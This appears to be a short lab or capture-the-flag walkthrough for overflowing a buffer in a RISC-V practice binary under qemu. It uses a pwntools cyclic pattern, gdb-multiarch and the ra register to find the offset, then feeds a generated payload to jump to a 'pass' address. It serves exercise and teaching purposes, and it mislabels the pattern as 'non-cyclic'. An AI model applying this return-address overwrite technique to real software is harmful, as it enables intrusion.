from objdump, memory address of .pass is 0x00000000000104e8 this is the target address

then using pwn generate a non cyclic string of 200 characters
pwn cyclic 200
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab

now we debug with gdb multi-arch

create two terminals

first in terminal 1 run
qemu-riscv64 -g 1234 ./target_Arjun0472

then in terminal 2 run
gdb-multiarch ./target_Arjun0472
(gdb) target remote localhost:1234
(gdb) continue

then in terminal 1, enter the 200 digit non-cyclic code. It will say "Sorry, try again."

then switch to terminal 2 and type
info registers ra, and we get a hexadecimal value

exit gdb
feed that hex value back into the cyclic tool to find out exactly how many bytes it took to reach that specific part of the pattern
run
cyclic -l (hexcode)
this will give the offset.
then in makepayload.py, enter offset and target address.

then finally run qemu-riscv64 target_Arjun0472 < payload

it will include you have passed